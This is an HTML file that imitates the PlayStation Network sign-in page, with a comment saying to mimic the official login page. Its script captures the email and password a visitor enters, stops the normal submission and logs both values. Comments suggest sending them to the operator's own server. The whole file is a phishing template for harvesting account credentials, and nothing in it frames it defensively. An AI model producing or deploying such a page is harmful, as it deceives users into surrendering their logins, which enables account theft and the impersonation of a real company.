<!DOCTYPE html>
<html>
<head>
    <title>PlayStation Network</title>
    <style>
        /* Add your CSS here to mimic the official PSN login page */
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Sign in to PlayStation Network</h2>
        <form id="loginForm">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            <br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <br>
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            // Send the credentials to your server or log them
            console.log('Email:', email);
            console.log('Password:', password);
            // You can also use fetch or XMLHttpRequest to send the data to your server
        });
    </script>
</body>
</html>
